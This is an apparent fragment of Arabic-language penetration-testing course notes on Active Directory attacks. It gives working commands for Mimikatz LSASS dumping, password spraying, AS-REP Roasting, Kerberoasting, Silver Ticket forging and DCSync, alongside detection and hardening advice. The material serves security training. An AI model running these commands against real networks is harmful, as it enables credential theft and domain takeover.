+<div class="diagram-card">
+<svg viewBox="0 0 700 220" xmlns="http://www.w3.org/2000/svg">
+  <text x="350" y="18" text-anchor="middle" class="dsvg-txt" font-size="12" font-weight="700">Kerberos — المراحل الثلاث</text>
+
+  <rect x="10" y="90" width="130" height="55" rx="7" class="dsvg-box-b"/>
+  <text x="75" y="113" text-anchor="middle" class="dsvg-blue" font-size="12" font-weight="700">Client</text>
+  <text x="75" y="130" text-anchor="middle" class="dsvg-muted" font-size="9">Medium Integrity</text>
+
+  <rect x="285" y="40" width="130" height="55" rx="7" class="dsvg-box-r"/>
+  <text x="350" y="63" text-anchor="middle" class="dsvg-red" font-size="12" font-weight="700">KDC</text>
+  <text x="350" y="80" text-anchor="middle" class="dsvg-muted" font-size="9">Domain Controller</text>
+
+  <rect x="560" y="90" width="130" height="55" rx="7" class="dsvg-box-g"/>
+  <text x="625" y="113" text-anchor="middle" class="dsvg-green" font-size="12" font-weight="700">App Server</text>
+  <text x="625" y="130" text-anchor="middle" class="dsvg-muted" font-size="9">SPN المستهدَف</text>
+
+  <text x="200" y="55" text-anchor="middle" class="dsvg-amber" font-size="9">① AS-REQ/REP → TGT</text>
+  <text x="500" y="55" text-anchor="middle" class="dsvg-amber" font-size="9">② TGS-REQ/REP → Service Ticket</text>
+  <text x="350" y="185" text-anchor="middle" class="dsvg-amber" font-size="9">③ AP-REQ (Service Ticket) → وصول للخدمة</text>
+
+  <line x1="140" y1="100" x2="285" y2="70" class="dsvg-line"/>
+  <line x1="415" y1="70" x2="560" y2="100" class="dsvg-line"/>
+  <line x1="140" y1="130" x2="560" y2="130" class="dsvg-line" stroke-dasharray="4 4"/>
+</svg>
+<div class="diagram-caption">الـ DC مش بيتدخّل إلا عند إصدار التذاكر — بعد كده الوصول بيتم مباشرةً بين العميل والخدمة</div>
+</div>
+
+<h3>NTLM مقابل Kerberos — الفروق الجوهرية</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الخاصية</th><th>NTLM</th><th>Kerberos</th></tr></thead>
+<tbody>
+<tr><td>نموذج الاتصال</td><td>اتصال مباشر مع السيرفر</td><td>طرف ثالث موثوق (KDC)</td></tr>
+<tr><td>نموذج العمل</td><td>Challenge-Response في كل مرة</td><td>نظام تذاكر — Single Sign-On</td></tr>
+<tr><td>دور الـ DC</td><td>يتحقّق مع كل محاولة مصادقة</td><td>يتدخّل فقط عند إصدار التذكرة</td></tr>
+<tr><td>تخزين الهاش</td><td>في LSASS — قابل لإعادة الاستخدام مباشرةً</td><td>تذاكر لها صلاحية زمنية (TGT ~10 ساعات)</td></tr>
+<tr><td>المصادقة المتبادلة</td><td>غير موجودة</td><td>موجودة — الطرفان يتحققان من بعض</td></tr>
+<tr><td>سرعة التكسير</td><td>MD4 سريع جدًا — قابل للتكسير بالـ GPU</td><td>Timestamps مشفّرة تمنع الـ Replay</td></tr>
+<tr><td>الثغرة الرئيسية</td><td>Pass-the-Hash</td><td>Kerberoasting — أي مستخدم يقدر يطلب TGS</td></tr>
+</tbody>
+</table></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU4 -->
+<h2 id="lu4"><span class="num">04</span><span class="htext">بيانات الاعتماد المخزَّنة وLSASS</span></h2>
+
+<h3>ليه Windows بيخزّن بيانات الاعتماد؟</h3>
+<ul>
+<li>الـ Single Sign-On (SSO) محتاج تخزين مواد المصادقة — من غير تخزين، المستخدم هيحتاج يدخل كلمة المرور في كل مرة يوصل فيها لمورد جديد</li>
+<li>اللي LSASS بيخزّنه: NTLM Hashes للمستخدمين المسجّلين، TGT Kerberos (صالحة 10 ساعات)، TGS Kerberos (لكل خدمة)، وعلى الأنظمة القديمة أو المُهيَّأة بشكل خاطئ: كلمات مرور WDigest بشكل Plaintext</li>
+</ul>
+
+<div class="callout definition">
+<div class="callout-label">تعريف</div>
+<p><strong>LSASS</strong> = Local Security Authority Subsystem Service. بيشتغل بصلاحيات SYSTEM — أعلى عملية صلاحيات في Windows. الوصول لذاكرته بيحتاج Administrator + SeDebugPrivilege.</p>
+</div>
+
+<h3>ايه اللي المهاجم يقدر يعمله ببيانات الاعتماد المخزَّنة؟</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>نوع البيانات</th><th>الاستخدام الهجومي</th></tr></thead>
+<tbody>
+<tr><td>NTLM Hash</td><td>تكسير أوفلاين لاسترجاع كلمة المرور، أو Pass-the-Hash للمصادقة مباشرةً</td></tr>
+<tr><td>Kerberos TGT</td><td>Pass-the-Ticket لانتحال شخصية المستخدم لأي خدمة — لو TGT لحساب DA = وصول لكامل الدومين</td></tr>
+<tr><td>Kerberos TGS</td><td>وصول للخدمة المحدَّدة فقط كالمستخدم الشرعي؛ لو PAC validation معطّلة → Silver Ticket ممكن</td></tr>
+</tbody>
+</table></div>
+
+<h3>أنواع الهاشات والتذاكر في LSASS</h3>
+<div class="method-grid">
+<div class="method-card"><span class="mnum">01</span><div class="mtitle">NTLM Hash</div><div class="mdesc">موجود في كل بيئات Windows الحديثة — قابل للاستخدام في Pass-the-Hash والتكسير الأوفلاين.</div></div>
+<div class="method-card"><span class="mnum">02</span><div class="mtitle">SHA-1 / AES Keys</div><div class="mdesc">مستخدَمة جنبًا إلى جنب مع تشفير Kerberos الحديث.</div></div>
+<div class="method-card"><span class="mnum">03</span><div class="mtitle">WDigest Plaintext</div><div class="mdesc">موجودة على الأنظمة القديمة أو لو اتفعّلت يدويًا — كلمة مرور Plaintext حرفية، استغلالها تافه.</div></div>
+<div class="method-card"><span class="mnum">04</span><div class="mtitle">Kerberos TGT</div><div class="mdesc">بتسمح بطلب أي Service Ticket من غير إعادة مصادقة.</div></div>
+<div class="method-card"><span class="mnum">05</span><div class="mtitle">Kerberos TGS</div><div class="mdesc">تذكرة خاصة بخدمة واحدة محدَّدة فقط.</div></div>
+</div>
+
+<h3>الإجراءات الدفاعية</h3>
+<div class="method-grid">
+<div class="method-card"><div class="mtitle">LSA Protection (RunAsPPL)</div><div class="mdesc">بيحوّل LSASS لـ Protected Process Light — بيمنع حتى الـ Admins من قراءة ذاكرته. قابل للتجاوز باستخدام Kernel Drivers.</div></div>
+<div class="method-card"><div class="mtitle">Credential Guard</div><div class="mdesc">يعزل بيانات الاعتماد داخل Enclave في الـ Hypervisor (Virtualization-Based) — فعّال جدًا وصعب تجاوزه. يحتاج دعم UEFI وVirtualization.</div></div>
+<div class="method-card"><div class="mtitle">تعطيل WDigest</div><div class="mdesc">عن طريق الـ Registry: <code>HKLM\SYSTEM\..\WDigest → UseLogonCredential=0</code></div></div>
+</div>
+
+<h3>Mimikatz — استخراج بيانات الاعتماد المخزَّنة</h3>
+<div class="callout case">
+<div class="callout-label">متطلّبات التشغيل</div>
+<p>Mimikatz هو الأداة المرجعية لاستخراج بيانات الاعتماد من LSASS. محتاج: صلاحيات Local Administrator، SeDebugPrivilege (تصحيح أي عملية)، وSYSTEM Token (عبر <code>token::elevate</code>). متاح كمان عبر Metasploit Kiwi extension، أو Procdump + تحليل أوفلاين لتقليل الأثر (OPSEC).</p>
+</div>
+<div class="code-wrap"><span class="code-tag">mimikatz — lsass credential extraction</span><pre><code>privilege::debug
+token::elevate
+
+# تفريغ كل بيانات الاعتماد من LSASS
+sekurlsa::logonpasswords
+# بيعرض: NTLM hash + plaintext (لو WDigest مفعَّلة)
+
+# تصدير تذاكر Kerberos
+sekurlsa::tickets /export
+# بيحفظ ملفات .kirbi لاستخدامها في Pass-the-Ticket
+
+# تفريغ قاعدة بيانات SAM
+lsadump::sam
+
+# حقن تذكرة محفوظة
+kerberos::ptt [ticket.kirbi]
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU5 -->
+<h2 id="lu5"><span class="num">05</span><span class="htext">Password Spraying في AD</span></h2>
+
+<h3>Password Spraying مقابل Brute Force</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الأسلوب</th><th>الطريقة</th><th>المخاطرة</th></tr></thead>
+<tbody>
+<tr><td>Brute Force</td><td>كلمات مرور كتير ← مستخدم واحد</td><td>بيقفل الحساب بسرعة — صاخب ومكتشَف فورًا</td></tr>
+<tr><td>Password Spraying</td><td>كلمة مرور واحدة ← مستخدمين كتير</td><td>بيفضل تحت حد القفل — فعّال لأن المستخدمين بيشاركوا أنماط متوقَّعة (Season+Year، Company+123!، Welcome1!)</td></tr>
+</tbody>
+</table></div>
+
+<div class="callout warning">
+<div class="callout-label">أول خطوة دايمًا</div>
+<p>افحص سياسة القفل (Lockout Policy) قبل أي محاولة: <code>net accounts /domain</code> — بيرجّع حد القفل، مدته، ونافذة المراقبة (Observation Window). الـ Spray لازم يكون بمحاولة واحدة فقط لكل نافذة مراقبة عشان تفضل آمن.</p>
+</div>
+
+<h3>ثلاث طرق للـ Spraying</h3>
+<div class="method-grid">
+<div class="method-card">
+  <div class="mtitle">LDAP Spraying</div>
+  <div class="mdesc">بيستخدم مصادقة LDAP مباشرة مع الـ DC — أثر شبكي منخفض جدًا. محاولة Bind ناجحة = بيانات اعتماد صحيحة. الأنسب للتقييمات اللي الأهم فيها التخفّي، واللوجات بتظهر كمصادقة LDAP عادية.</div>
+</div>
+<div class="method-card">
+  <div class="mtitle">SMB Spraying</div>
+  <div class="mdesc">محاولة دخول عبر SMB (بورت 445) — أثر شبكي أعلى، لكن بتكشف هل فيه صلاحيات Admin على أجهزة معيّنة. الأدوات: CrackMapExec، Metasploit smb_login.</div>
+</div>
+<div class="method-card">
+  <div class="mtitle">Kerberos TGT Spraying</div>
+  <div class="mdesc">طلب TGT لكل توليفة مستخدم/كلمة مرور — أسرع طريقة. بيانات صحيحة = تذكرة TGT، بيانات خاطئة = <code>KRB5KDC_ERR_PREAUTH_FAILED</code>. أدوات: Rubeus, kerbrute, Invoke-Kerberoast.</div>
+</div>
+</div>
+
+<h3>أوامر عملية</h3>
+<div class="code-wrap"><span class="code-tag">powershell — ldap spraying</span><pre><code>$domain = 'DC=corp,DC=com'
+foreach ($user in $users) {
+    $entry = New-Object DirectoryServices.DirectoryEntry(
+        "LDAP://dc1", "corp\$user", 'Passw0rd')
+    if ($entry.name) { "VALID: $user" }
+}
+</code></pre></div>
+
+<div class="code-wrap"><span class="code-tag">crackmapexec — smb spraying</span><pre><code>crackmapexec smb 192.168.50.10 -u users.txt -p 'Passw0rd!' --continue-on-success
+</code></pre></div>
+
+<div class="code-wrap"><span class="code-tag">rubeus — kerberos spraying</span><pre><code># الأسرع — من غير أي اتصال SMB
+Rubeus.exe brute /users:users.txt /password:Passw0rd! /noticket /delay:500
+# delay = ms بين كل محاولة ومحاولة
+</code></pre></div>
+
+<div class="callout tip">
+<div class="callout-label">اختيار الطريقة المناسبة</div>
+<p>تخفّي قبل أي حاجة؟ LDAP. محتاج تكشف أجهزة فيها صلاحيات Admin؟ SMB. محتاج أسرع نتيجة بأقل أثر شبكي؟ Kerberos TGT.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU6 -->
+<h2 id="lu6"><span class="num">06</span><span class="htext">AS-REP Roasting</span></h2>
+
+<h3>Kerberos Pre-Authentication — ليه موجودة؟</h3>
+<ul>
+<li>Kerberos العادي بيتطلّب Pre-Authentication — العميل لازم يثبت معرفته بكلمة المرور قبل ما يستلم AS-REP</li>
+<li>بيتم ده عن طريق تشفير Timestamp بهاش كلمة مرور المستخدم</li>
+<li>من غير شرط الـ Pre-Auth: أي حد يقدر يطلب AS-REP لأي مستخدم من غير ما يعرف كلمة مروره</li>
+<li>الـ AS-REP بتحتوي على بيانات مشفّرة بهاش كلمة مرور المستخدم → المهاجم بيلتقطها ويكسّرها أوفلاين</li>
+</ul>
+<div class="callout danger">
+<div class="callout-label">إعداد خطير</div>
+<p>الخاصية <code>Do not require Kerberos preauthentication</code> دعوة مباشرة للهجوم.</p>
+</div>
+
+<h3>مين عنده Pre-Auth معطّلة؟</h3>
+<ul>
+<li>افتراضيًا: <strong>كل</strong> المستخدمين لازم يعملوا Pre-Authentication</li>
+<li>الإدمن بيعطّلها غالبًا بسبب: تطبيقات قديمة مش قادرة تعمل Pre-Auth، متطلّبات توافق مع برامج Third-party، أو سوء إعداد بدون وعي</li>
+<li>طرق الاكتشاف: <code>Get-NetUser -PreauthNotRequired</code> (PowerView)، LDAP filter <code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code>، أو <code>Get-ADUser -Filter 'DoesNotRequirePreAuth -eq True'</code></li>
+</ul>
+
+<h3>تدفّق هجوم AS-REP Roasting</h3>
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">إيجاد الحسابات المعرَّضة</div>
+<div class="step-body"><p>استعلام AD عن المستخدمين اللي عندهم <code>Do not require Kerberos preauthentication</code> مفعَّلة، باستخدام LDAP filter أو PowerView.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">طلب AS-REP (بدون الحاجة لكلمة المرور)</div>
+<div class="step-body"><p>إرسال AS-REQ للمستخدم المستهدَف — الـ DC بيرد بـ AS-REP من غير التحقق من معرفة كلمة المرور.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">استخراج الهاش المشفَّر</div>
+<div class="step-body"><p>الـ AS-REP بتحتوي على بيانات مشفّرة بهاش كلمة مرور المستخدم — بتتحفظ بصيغة متوافقة مع Hashcat.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">تكسير أوفلاين</div>
+<div class="step-body"><p>استخدام Hashcat mode 18200 (Kerberos AS-REP) مع Wordlist وRules — بدون أي خطر قفل حساب أثناء التكسير.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">استخدام كلمة المرور المسترجَعة</div>
+<div class="step-body"><p>المصادقة في AD كالمستخدم، التعداد الإضافي، أو استخدام بيانات الاعتماد للحركة الجانبية.</p></div>
+</div>
+</div>
+
+<h3>أوامر Windows وLinux</h3>
+<div class="code-wrap"><span class="code-tag">windows — rubeus (auto-discover)</span><pre><code>Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+</code></pre></div>
+<div class="code-wrap"><span class="code-tag">linux — impacket</span><pre><code>impacket-GetNPUsers corp.com/ -usersfile users.txt -format hashcat -outputfile hashes.txt
+</code></pre></div>
+<div class="code-wrap"><span class="code-tag">hashcat — mode 18200</span><pre><code>hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule
+
+# مثال على نتيجة التكسير:
+$krb5asrep$23$dave@corp.com:...:Flowers1!
+</code></pre></div>
+
+<div class="callout tip">
+<div class="callout-label">AS-REP Roasting موجَّه</div>
+<p>لو عندك صلاحية <code>GenericWrite</code> أو <code>GenericAll</code> على حساب مستخدم — تقدر تفعّل تعطيل الـ Pre-Auth عليه بنفسك، تنفّذ الهجوم، وترجّع الإعداد لوضعه الأصلي بعد كده.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU7 -->
+<h2 id="lu7"><span class="num">07</span><span class="htext">Kerberoasting</span></h2>
+
+<h3>ليه Kerberoasting قوي جدًا</h3>
+<ul>
+<li>أي مستخدم دومين مصادَق عليه يقدر يطلب TGS لأي SPN</li>
+<li>الـ KDC <strong>مش</strong> بيتحقق إن الطالب مُصرَّح له باستخدام الخدمة — التفويض بيحصل لاحقًا، وقت ما المستخدم يتصل فعليًا بالخدمة</li>
+<li>الثغرة الجوهرية: Service Tickets متشفّرة بهاش NTLM الخاص بحساب الخدمة نفسه → المهاجم بيطلب التذكرة، يحفظ البيانات المشفّرة، ويكسّرها أوفلاين من غير أي اتصال بالخدمة</li>
+</ul>
+<div class="callout warning">
+<div class="callout-label">بدون مخاطرة</div>
+<p>مفيش Account Lockout في الهجوم ده — ده عملية Kerberos عادية ومتوقَّعة تمامًا. المتطلَّب الوحيد: حساب دومين عادي صالح.</p>
+</div>
+
+<h3>ليه حسابات الخدمة ضعيفة</h3>
+<div class="callout danger">
+<div class="callout-label">عوامل الخطورة</div>
+<ul>
+<li>كلمات المرور غالبًا بتتحدَّد مرة واحدة ومش بتتغيّر لسنين</li>
+<li>الإدمن أحيانًا بيحطّ كلمات مرور بسيطة "للتوافق"</li>
+<li>غالبًا عندها صلاحيات عالية (عضوية Domain Admins، Local Admin)</li>
+<li>التطبيقات القديمة ممكن تكون مكتوب فيها بيانات الاعتماد بشكل ثابت (Hard-coded)</li>
+</ul>
+</div>
+<div class="callout tip">
+<div class="callout-label">حسابات محصَّنة من Kerberoasting</div>
+<p>Managed Service Accounts (MSA) بكلمة مرور 30 حرف تلقائية التدوير، Group MSAs (gMSA) بكلمة مرور 120 حرف، وحسابات الأجهزة (Computer Accounts) بكلمة مرور 120 حرف تلقائية التدوير.</p>
+</div>
+
+<h3>تدفّق الهجوم الكامل</h3>
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">إيجاد الحسابات اللي عندها SPNs</div>
+<div class="step-body"><p>استعلام AD عن حسابات المستخدمين (مش حسابات الأجهزة) اللي عندها خاصية servicePrincipalName مضبوطة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">طلب تذاكر TGS</div>
+<div class="step-body"><p>أي مستخدم دومين بيطلب Service Tickets لكل الـ SPNs دي — الـ KDC بيرد من غير التحقق من التفويض.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">استخراج هاش TGS-REP</div>
+<div class="step-body"><p>حفظ الجزء المشفَّر من كل Service Ticket — ده متشفّر بهاش NTLM الخاص بحساب الخدمة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">تكسير أوفلاين</div>
+<div class="step-body"><p>استخدام Hashcat mode 13100 (Kerberos 5 TGS-REP) — بدون قفل حساب وبدون ضوضاء شبكية أثناء التكسير.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">استخدام الحساب المخترَق</div>
+<div class="step-body"><p>لو حساب الخدمة عنده صلاحيات عالية → تصعيد لـ Domain Admin أو الوصول لخدمات حرجة.</p></div>
+</div>
+</div>
+
+<h3>أوامر Windows وLinux</h3>
+<div class="code-wrap"><span class="code-tag">windows — rubeus</span><pre><code># اكتشاف تلقائي لكل الحسابات القابلة لـ Kerberoasting
+Rubeus.exe kerberoast /outfile:hashes.txt
+
+# استهداف مستخدم محدَّد
+Rubeus.exe kerberoast /user:svc_mssql /outfile:svc_mssql_hash.txt
+</code></pre></div>
+<div class="code-wrap"><span class="code-tag">linux — impacket</span><pre><code>impacket-GetUserSPNs corp.com/stephanie:'PW' -request -outputfile hashes.txt
+</code></pre></div>
+<div class="code-wrap"><span class="code-tag">hashcat — mode 13100</span><pre><code>hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule
+
+# مثال على نتيجة التكسير:
+$krb5tgs$23$*svc_mssql$...:Mssql@2023!
+</code></pre></div>
+
+<div class="callout note">
+<div class="callout-label">ملاحظة مهمة</div>
+<p>الـ etype 17/18 (تشفير AES) أصعب بكتير في التكسير من etype 23 (RC4) — نوع التشفير بيأثر مباشرة على سرعة وجدوى الهجوم.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU8 -->
+<h2 id="lu8"><span class="num">08</span><span class="htext">Silver Tickets</span></h2>
+
+<h3>ازاي بتشتغل Silver Tickets</h3>
+<ul>
+<li>Silver Ticket = تذكرة Kerberos خدمة مزوَّرة بالكامل</li>
+<li>السبب إن ده ممكن: Service Tickets متشفّرة فقط بهاش حساب الخدمة — لو المهاجم عنده الهاش ده، يقدر يزوّر تذكرة بأي هوية وأي صلاحيات</li>
+<li>الخدمة بتفكّ تشفير التذكرة ببيانات اعتمادها الخاصة — وبتعتبرها "صالحة" من غير أي تواصل مع الـ KDC</li>
+</ul>
+<div class="callout tip">
+<div class="callout-label">ميزة أساسية — تجاوز الـ DC بالكامل</div>
+<p>مفيش أي تواصل شبكي مع الـ DC، ومفيش أي لوجات بتتسجّل عند الـ DC لإصدار التذكرة — ده بيخلّيها أكثر تخفّيًا من Golden Tickets.</p>
+</div>
+<div class="callout danger">
+<div class="callout-label">القيد الأساسي</div>
+<p>التذكرة شغّالة فقط على الخدمة المرتبطة بالـ SPN المحدَّد اللي اتزوَّرت على أساسه.</p>
+</div>
+
+<h3>المطلوب لعمل Silver Ticket</h3>
+<div class="method-grid">
+<div class="method-card"><span class="mnum">1</span><div class="mtitle">NTLM Hash لحساب الخدمة</div><div class="mdesc">عبر Kerberoasting + تكسير، تفريغ Mimikatz، أو استخراج من LSASS.</div></div>
+<div class="method-card"><span class="mnum">2</span><div class="mtitle">Domain SID</div><div class="mdesc">بيحدّد الدومين بشكل فريد — ضروري لبناء هيكل التذكرة. <code>whoami /user</code> بيعرض SID المستخدم، شيل آخر جزء منه = Domain SID. أو <code>Get-DomainSID</code> من PowerView.</div></div>
+<div class="method-card"><span class="mnum">3</span><div class="mtitle">Target SPN</div><div class="mdesc">اسم خدمة Service Principal Name الدقيق المراد تزوير الوصول ليها، مثال: <code>MSSQLSvc/dc1.corp.com:1433</code>.</div></div>
+</div>
+
+<h3>تزوير Silver Ticket بـ Mimikatz</h3>
+<div class="callout case">
+<div class="callout-label">سيناريو</div>
+<p>اتعمل Kerberoasting لحساب <code>svc_mssql</code> وانكسر الهاش: <code>Mssql@2023!</code>. الهدف: تزوير TGS لـ MSSQL والوصول لقاعدة البيانات كـ SA.</p>
+</div>
+<div class="code-wrap"><span class="code-tag">mimikatz — silver ticket forging</span><pre><code>whoami /user
+# S-1-5-21-XXXX-YYYY-ZZZZ-1001 → Domain SID = بدون آخر رقم
+
+# تحويل كلمة المرور لهاش NTLM:
+python -c "import hashlib,binascii; print(binascii.hexlify(hashlib.new('md4','Mssql@2023!'.encode('utf-16le')).digest()))"
+
+kerberos::golden /sid:S-1-5-21-XXXX-YYYY-ZZZZ /domain:corp.com /ptt \
+  /target:dc1.corp.com /service:mssqlsvc /rc4:&lt;NTLM_HASH&gt; /user:Administrator
+# /ptt = حقن مباشر في الجلسة الحالية
+</code></pre></div>
+
+<div class="callout warning">
+<div class="callout-label">نقطة خطيرة</div>
+<p>الهجوم ده بيشتغل حتى لو اتغيّرت كلمة المرور الحقيقية لحساب المستخدم اللي اتزوَّرت هويته — التذكرة صالحة لحد ما تنتهي مدتها (~10 ساعات).</p>
+</div>
+
+<h3>الدفاعات والقيود</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الكشف / الدفاع</th><th>التفاصيل</th></tr></thead>
+<tbody>
+<tr><td>PAC Validation</td><td>لو مفعَّلة، الخدمة بتطلب من الـ DC التحقق من محتوى التذكرة</td></tr>
+<tr><td>Event ID 4769</td><td>طلبات Service Ticket — أسماء مستخدمين غير طبيعية في اللوجات مؤشّر على تذاكر مزوَّرة</td></tr>
+<tr><td>Managed Service Accounts</td><td>استخدام MSA/gMSA بكلمات مرور تلقائية التدوير يمنع الهجوم من الأساس</td></tr>
+<tr><td>KDC PAC Validation</td><td>تفعيلها عبر KDCValidation registry key</td></tr>
+<tr><td>تقليل صلاحيات حساب الخدمة</td><td>الحد الأدنى من الصلاحيات المطلوبة فقط</td></tr>
+</tbody>
+</table></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU9 -->
+<h2 id="lu9"><span class="num">09</span><span class="htext">DCSync Attack</span></h2>
+
+<h3>ازاي بيشتغل DCSync</h3>
+<ul>
+<li>بيئات AD الحديثة بتستخدم أكتر من Domain Controller للتكرار (Redundancy)</li>
+<li>الـ DCs بتتزامن باستخدام بروتوكول DRS (Directory Replication Service) Remote</li>
+<li>أي DC يقدر يطلب تحديثات لأي Object من DC تاني</li>
+<li>نقطة الضعف الجوهرية: الـ DC المستلِم بيتحقق من <strong>الصلاحيات</strong> فقط — مش من إن الطالب DC فعلي ولا لأ</li>
+<li>لو حساب عنده صلاحيات تكرار → يقدر ينتحل شخصية DC ويطلب بيانات اعتماد لأي مستخدم في الدومين</li>
+<li>الصلاحيات المطلوبة (أي واحدة منها): Replicating Directory Changes · Replicating Directory Changes All · Replicating Directory Changes in Filtered Set</li>
+</ul>
+
+<div class="diagram-card">
+<svg viewBox="0 0 700 150" xmlns="http://www.w3.org/2000/svg">
+  <rect x="10" y="45" width="160" height="60" rx="7" class="dsvg-box-r"/>
+  <text x="90" y="70" text-anchor="middle" class="dsvg-red" font-size="12" font-weight="700">Attacker</text>
+  <text x="90" y="88" text-anchor="middle" class="dsvg-muted" font-size="9">عنده صلاحيات DA</text>
+
+  <rect x="270" y="45" width="160" height="60" rx="7" class="dsvg-box-a"/>
+  <text x="350" y="70" text-anchor="middle" class="dsvg-amber" font-size="12" font-weight="700">ينتحل DC</text>
+  <text x="350" y="88" text-anchor="middle" class="dsvg-muted" font-size="9">DRSUAPI replication request</text>
+
+  <rect x="530" y="45" width="160" height="60" rx="7" class="dsvg-box-g"/>
+  <text x="610" y="70" text-anchor="middle" class="dsvg-green" font-size="12" font-weight="700">Domain Controller</text>
+  <text x="610" y="88" text-anchor="middle" class="dsvg-muted" font-size="9">يرد بهاشات NTDS.DIT</text>
+
+  <line x1="170" y1="75" x2="270" y2="75" class="dsvg-line"/>
+  <line x1="430" y1="75" x2="530" y2="75" class="dsvg-line"/>
+</svg>
+<div class="diagram-caption">الـ DC بيتحقق من الصلاحية فقط — مش من هوية الطالب الحقيقية — وده ما يسمح بانتحال DC كامل</div>
+</div>
+
+<h3>ليه DCSync هو الهجوم النهائي على AD</h3>
+<ul>
+<li>بيسمح بسحب بيانات اعتماد <strong>أي</strong> حساب بما فيهم: كل حسابات Domain Admin، حساب <strong>KRBTGT</strong> (بيتيح عمل Golden Ticket)، حساب Administrator المدمَج حتى لو اتغيّر اسمه، وكل حسابات الخدمة</li>
+<li>مش محتاج تكون مسجّل دخول على الـ DC أصلًا</li>
+<li>بيشتغل عن بُعد من أي جهاز Domain-joined أو حتى غير منضم للدومين</li>
+<li>بيولّد Replication Traffic — لكن ده طبيعي جدًا في بيئات AD</li>
+</ul>
+<div class="callout danger">
+<div class="callout-label">النتيجة</div>
+<p>حساب DA واحد مخترَق = تفريغ بيانات اعتماد الدومين بالكامل.</p>
+</div>
+
+<h3>التنفيذ على Windows وLinux</h3>
+<div class="code-wrap"><span class="code-tag">windows — mimikatz lsadump::dcsync</span><pre><code>lsadump::dcsync /user:corp\dave
+lsadump::dcsync /user:corp\Administrator
+lsadump::dcsync /user:corp\krbtgt
+lsadump::dcsync /all /csv
+
+# المخرجات تشمل:
+Hash NTLM: 2a944a7...
+Hash SHA1: ...
+</code></pre></div>
+<div class="code-wrap"><span class="code-tag">linux — impacket-secretsdump</span><pre><code># استخراج حساب محدَّد فقط
+impacket-secretsdump corp.com/jeffadmin:'PW'@192.168.50.70 -just-dc-user dave
+
+# تفريغ كامل — كل الهاشات
+impacket-secretsdump corp.com/jeffadmin:'PW'@dc1
+</code></pre></div>
+
+<h3>الكشف والدفاع</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>مؤشرات الكشف</th><th>الإجراءات الدفاعية</th></tr></thead>
+<tbody>
+<tr><td>Event ID 4662 — Directory Access Audit؛ فلترة على صلاحية Replicating Directory Changes من حساب غير DC</td><td>تفعيل Object Access Auditing عبر Group Policy → Advanced Audit Policy → Directory Service Access</td></tr>
+<tr><td>Event ID 4624 — تسجيلات دخول غير طبيعية ببيانات اعتماد DA من أجهزة غير DC</td><td>مجموعة Protected Users — تمنع مصادقة NTLM، تخزين بيانات الاعتماد، والتفويض</td></tr>
+<tr><td>حركة DRSUAPI (بورت 135 + RPC ديناميكي) من IPs مش DC</td><td>Privileged Access Workstations (PAW) — حسابات DA تسجّل دخول فقط من محطات معزولة</td></tr>
+</tbody>
+</table></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ METHODOLOGY -->
+<h2 id="methodology"><span class="htext">منهجية الهجوم المتكامل على AD Auth</span></h2>
+
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">موطئ قدم أولي</div>
+<div class="step-body"><p>الحصول على حساب دومين عادي (عبر Phishing، تسريب بيانات اعتماد، أو وصول فيزيائي محدود) — نقطة البداية لأغلب هجمات AD.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">فحص سياسة القفل ثم Password Spraying</div>
+<div class="step-body"><p>لو معندكش بيانات اعتماد أصلًا، ابدأ بـ <code>net accounts /domain</code> ثم Spray محسوب بمحاولة واحدة لكل نافذة مراقبة — هدفك أول حساب دومين صالح.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">تعداد الحسابات المعرَّضة</div>
+<div class="step-body"><p>دوَّر على حسابات Pre-Auth معطّلة (AS-REP Roasting) وحسابات عندها SPNs (Kerberoasting) — كلاهما هجمات أوفلاين بدون خطر قفل.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">تكسير الهاشات المُلتقَطة أوفلاين</div>
+<div class="step-body"><p>Hashcat mode 18200 أو 13100 حسب نوع الهجوم — ركّز على حسابات الخدمة، غالبًا عندها كلمات مرور قديمة وضعيفة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">استغلال LSASS على أي جهاز متاح</div>
+<div class="step-body"><p>لو وصلت لصلاحيات Local Admin على أي جهاز — Mimikatz لاستخراج هاشات وTickets إضافية، أو Pass-the-Hash / Pass-the-Ticket للحركة الجانبية.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">6</div>
+<div class="step-title">تزوير Silver Ticket عند الحاجة</div>
+<div class="step-body"><p>لو عندك هاش حساب خدمة معيّن وعايز وصول فوري لخدمة واحدة بدون لمس الـ DC — Silver Ticket أسرع وأكتر تخفّيًا.</p></div>
+</div>
